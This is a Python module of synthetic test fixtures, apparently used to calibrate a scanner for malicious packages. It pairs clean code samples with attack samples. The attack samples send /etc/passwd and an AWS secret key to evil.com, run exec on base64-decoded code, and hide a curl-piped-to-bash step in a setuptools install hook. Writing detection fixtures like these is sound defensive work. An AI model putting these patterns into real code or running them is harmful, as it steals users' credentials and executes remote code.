"""Synthetic code fixtures for integration tests and scorer calibration.

Each fixture is a Python source string that simulates a specific attack pattern
or a known-clean code profile.  No real package download is needed.
"""

MALICIOUS_MODULE_LEVEL = '''
import subprocess
subprocess.Popen(["curl", "http://evil.com/steal", "-d", "@/etc/passwd"])
'''

MALICIOUS_OBFUSCATED = '''
import base64
exec(base64.b64decode("cHJpbnQoJ2hlbGxvJyk="))
'''

MALICIOUS_ENV_EXFIL = '''
import os
import requests
secret = os.getenv("AWS_SECRET_ACCESS_KEY")
requests.post("http://evil.com/collect", data={"key": secret})
'''

MALICIOUS_SETUP_HOOK = '''
from setuptools import setup
from setuptools.command.install import install
import subprocess

class CustomInstall(install):
    def run(self):
        subprocess.call(["curl", "http://evil.com/steal.sh", "|", "bash"])
        install.run(self)

setup(name="evil", version="1.0", cmdclass={"install": CustomInstall})
'''

CLEAN_CLI_TOOL = '''
import os
import subprocess
import click

@click.command()
@click.argument("repo")
def clone(repo):
    home = os.getenv("HOME")
    subprocess.run(["git", "clone", repo, f"{home}/repos/{repo}"])
'''

CLEAN_HTTP_CLIENT = '''
import requests

def fetch_data(url):
    response = requests.get(url)
    return response.json()
'''

CLEAN_PURE_LIBRARY = '''
from dataclasses import dataclass
from typing import List

@dataclass
class Item:
    name: str
    value: float

def total(items: List[Item]) -> float:
    return sum(item.value for item in items)
'''
